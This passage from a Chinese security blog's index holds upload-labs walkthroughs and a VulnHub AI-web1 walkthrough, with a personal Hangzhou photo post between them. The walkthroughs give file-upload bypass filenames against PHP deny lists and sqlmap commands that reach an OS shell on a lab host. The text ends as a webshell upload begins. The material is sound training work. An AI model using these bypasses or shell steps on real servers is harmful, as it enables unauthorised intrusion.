+<pre><code>$file_ext = trim($file_ext); //首尾去空</code></pre><p> <strong>利用Windows系统的文件名特性。文件名最后增加空格和点，写成<code>1.php .</code>，这个需要用burpsuite抓包修改，上传后保存在Windows系统上的文件名最后的一个<code>.</code>会被去掉，实际上保存的文件名就是1<code>.php</code></strong> </p>
+<p><img src="https://i.loli.net/2020/11/30/QsiotIUBjlkmYqc.png" alt></p>
+<h2 id="pass8"><a href="#pass8" class="headerlink" title="pass8"></a>pass8</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
+    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
+        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
+        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
+        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
+        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
+        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
+        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
+        
+        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
+            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
+            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
+            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
+                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
+            &#125; <span class="hljs-keyword">else</span> &#123;
+                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
+            &#125;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
+        &#125;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
+    &#125;
+&#125;</code></pre>
+
+<p>这段代码少了这句话，可以与第六关相同的做法</p>
+<p><code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p>
+<p><img src="https://i.loli.net/2020/11/30/tyb45fg3MiCU1jG.png" alt></p>
+<h2 id="pass9"><a href="#pass9" class="headerlink" title="pass9"></a>pass9</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
+    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
+        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
+        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
+        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
+        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
+        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
+        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
+        
+        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
+            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
+            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.date(<span class="hljs-string">&quot;YmdHis&quot;</span>).rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;
+            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
+                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
+            &#125; <span class="hljs-keyword">else</span> &#123;
+                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
+            &#125;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
+        &#125;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
+    &#125;
+&#125;</code></pre>
+
+<p>仔细观察发现少了这段代码</p>
+<pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span></code></pre>
+
+<p> 采用Windows文件流特性绕过 </p>
+<p>将文件名改为 <code>1.php::$DATA</code>,但是实质上保存的文件还是1.php</p>
+<p><img src="https://i.loli.net/2020/11/30/XKUGAeVRzTxNW8Y.png" alt></p>
+<h2 id="pass10"><a href="#pass10" class="headerlink" title="pass10"></a>pass10</h2><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;
+<span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
+    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
+        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>,<span class="hljs-string">&quot;.ini&quot;</span>);
+        <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
+        <span class="hljs-variable">$file_name</span> = deldot(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span>
+        <span class="hljs-variable">$file_ext</span> = strrchr(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);
+        <span class="hljs-variable">$file_ext</span> = strtolower(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span>
+        <span class="hljs-variable">$file_ext</span> = str_ireplace(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span>
+        <span class="hljs-variable">$file_ext</span> = trim(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span>
+        
+        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;
+            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
+            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
+            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
+                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
+            &#125; <span class="hljs-keyword">else</span> &#123;
+                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
+            &#125;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;
+        &#125;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
+    &#125;
+&#125;</code></pre>
+
+<p> 这一句代码是用来检测末尾是否是<code>.</code>，可以双写绕过。<br>抓包将文件名改为<code>1.php. .</code> （注意两点之间有空格） 前面去掉.然后检验.不存在，再去空格，留下php.，然后php.不属于$deny_ext数组中存在的，当然就直接提交了。因为windows自动去点，于是php后缀就出来了 </p>
+<img src="https://i.loli.net/2020/11/30/wldCgUcOSKWPxMu.png" style="zoom:50%;">
+
+]]></content>
+      <categories>
+        <category>文件上传</category>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>MIME</tag>
+        <tag>大小写绕过</tag>
+        <tag>.htaccess</tag>
+        <tag>windows文件特性</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>半年杭州体验卡即将到期</title>
+    <url>/2022/12/07/vblog1/</url>
+    <content><![CDATA[<h1 id="杭州半年体验卡"><a href="#杭州半年体验卡" class="headerlink" title="杭州半年体验卡"></a>杭州半年体验卡</h1><p>本来以为一个学期会很慢，但是现在发现时间过得好快。</p>
+<p>四个月来拍了很多照片，在这里做个总结。</p>
+<h2 id="关于杭研"><a href="#关于杭研" class="headerlink" title="关于杭研"></a>关于杭研</h2><table>
+<thead>
+<tr>
+<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220909_125413767_iOS.jpg" alt="20220909_125413767_iOS"></th>
+<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_142137039_iOS.jpg" alt="20220910_142137039_iOS"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111228259.png" alt="image-20221207111228259"></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111355531.png" alt="image-20221207111355531"></td>
+</tr>
+<tr>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221130_094731139_iOS.jpg" alt="20221130_094731139_iOS"></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221112_092918159_iOS.jpg" alt="20221112_092918159_iOS"></td>
+</tr>
+</tbody></table>
+<h2 id="关于西湖"><a href="#关于西湖" class="headerlink" title="关于西湖"></a>关于西湖</h2><table>
+<thead>
+<tr>
+<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_090838376_iOS.jpg" alt="20220910_090838376_iOS"></th>
+<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_091601507_iOS.jpg" alt="20220910_091601507_iOS"></th>
+<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_092605365_iOS.jpg" alt="20220910_092605365_iOS"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_093711007_iOS.jpg" alt="20220910_093711007_iOS"></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_095123680_iOS.jpg" alt="20220910_095123680_iOS"></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_095545635_iOS.jpg" alt="20220910_095545635_iOS"></td>
+</tr>
+<tr>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_091850580_iOS.jpg" alt="20220910_091850580_iOS"></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_095521961_iOS.jpg" alt="20220910_095521961_iOS"></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220910_101905976_iOS.jpg" alt="20220910_101905976_iOS"></td>
+</tr>
+<tr>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221127_092047692_iOS.jpg" alt="20221127_092047692_iOS"></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221127_092218929_iOS.jpg" alt="20221127_092218929_iOS"></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221127_092607734_iOS.jpg" alt="20221127_092607734_iOS"></td>
+</tr>
+</tbody></table>
+<h2 id="关于绍兴"><a href="#关于绍兴" class="headerlink" title="关于绍兴"></a>关于绍兴</h2><table>
+<thead>
+<tr>
+<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111836034.png" alt="image-20221207111836034"></th>
+<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111857720.png" alt="image-20221207111857720"></th>
+<th align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111920504.png" alt></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111905422.png" alt="image-20221207111905422"></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207112733073.png" alt="image-20221207112733073"></td>
+<td align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207112652542.png" alt="image-20221207112652542"></td>
+</tr>
+<tr>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207112051468.png" alt="image-20221207112051468"></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221004_033920832_iOS.jpg" alt></td>
+<td align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207111929931.png" alt></td>
+</tr>
+</tbody></table>
+<h2 id="关于杭州"><a href="#关于杭州" class="headerlink" title="关于杭州"></a>关于杭州</h2><p>….</p>
+<table>
+<thead>
+<tr>
+<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114150650.png" alt="image-20221207114150650"></th>
+<th align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207113619574.png" alt="image-20221207113619574"></th>
+<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221003_042522512_iOS.jpg" alt></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207113814788.png" alt="image-20221207113814788"></td>
+<td align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207113919110.png" alt="image-20221207113919110"></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114011453.png" alt="image-20221207114011453"></td>
+</tr>
+<tr>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114342399.png" alt="image-20221207114304031"></td>
+<td align="center"><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114240111.png" alt="image-20221207114240111"></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207114408016.png" alt="image-20221207114408016"></td>
+</tr>
+</tbody></table>
+<h2 id="关于🌇"><a href="#关于🌇" class="headerlink" title="关于🌇"></a>关于🌇</h2><table>
+<thead>
+<tr>
+<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220916_100338097_iOS.jpg" alt></th>
+<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20221112_092603320_iOS.jpg" alt="20221112_092603320_iOS"></th>
+<th><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220621_110111436_iOS.jpg" alt></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221207144624211.png" alt="image-20221207144624211"></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220916_100927998_iOS.jpg" alt></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220916_100924916_iOS.jpg" alt></td>
+</tr>
+<tr>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220905_103525175_iOS.jpg" alt></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220916_100338097_iOS.jpg" alt></td>
+<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220630_111017267_iOS.jpg" alt></td>
+</tr>
+</tbody></table>
+<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/20220916_100528363_iOS.jpg" alt="20220916_100528363_iOS" style="zoom: 25%;">
+
+
+
+<h2 id="关于世界"><a href="#关于世界" class="headerlink" title="关于世界"></a>关于世界</h2><p>未知…</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>照片</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulnhub</title>
+    <url>/2022/09/30/vulnhub/</url>
+    <content><![CDATA[<h1 id="AI-web1"><a href="#AI-web1" class="headerlink" title="AI-web1"></a>AI-web1</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>只要使靶机与kali处于同一网段即可</p>
+<h2 id="网络嗅探"><a href="#网络嗅探" class="headerlink" title="网络嗅探"></a>网络嗅探</h2><p>在kali中使用</p>
+<pre><code class="hljs sh">netdiscover  <span class="hljs-comment"># 可以探测出与kali处于同一网段中存活的主机</span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929233618239.png" alt="image-20220929233618239"></p>
+<p>由图中的信息可以看到靶机的ip地址为<code>192.168.152.133</code></p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>使用nmap扫描指定的ip</p>
+<pre><code class="hljs sh">nmap -sS -sV -A -n 192.168.152.133</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929233830903.png" alt="image-20220929233830903"></p>
+<p>扫描结果显示靶机的80端口开放，并且探测到url，使用的中间件为apache</p>
+<p>访问  <code>m3diNf0/</code>和<code>/se3reTdir777/uploads/</code>，没有有用信息，继续扫描路径</p>
+<pre><code class="hljs sh">dirb http://192.168.152.133/m3diNf0/
+dirb http://192.168.152.133/se3reTdir777/uploads/
+dirb http://192.168.152.133/se3reTdir777/</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929234638450.png" alt="image-20220929234638450"></p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929234645788.png" alt="image-20220929234645788"></p>
+<p>扫描两个可访问的的url，在浏览器中打开，info.php中是phpinfo的信息，其中有一个信息很有用就是，网站的根目录</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929234927206.png" alt="image-20220929234927206"></p>
+<p>而<code>http://192.168.152.133/se3reTdir777/index.php</code>，是一个用户查询的接口，很明显像是sql注入，直接用sqlmap扫</p>
+<pre><code class="hljs sh">sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span>
+sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --dbs
+sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 --tables
+sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> -D aiweb1 -T user -columns</code></pre>
+
+<p>最后获得结果并没有什么用，但是可以尝试使用sqlmap获取shell权限</p>
+<pre><code class="hljs sh">sqlmap -u <span class="hljs-string">&quot;http://192.168.152.133/se3reTdir777/&quot;</span> -data <span class="hljs-string">&quot;uid=1&amp;Operation=Submit&quot;</span> --level=3 --os-shell</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220929235903463.png" alt="image-20220929235903463"></p>
+<p>能够获取shell权限，但是权限很低，只是www-data</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>前文我们已经知道网站绝对路径，其实就就是可以尝试sqlmap的文件上传</p>
+<p>将一句话木马上传到网站的根目录中</p>
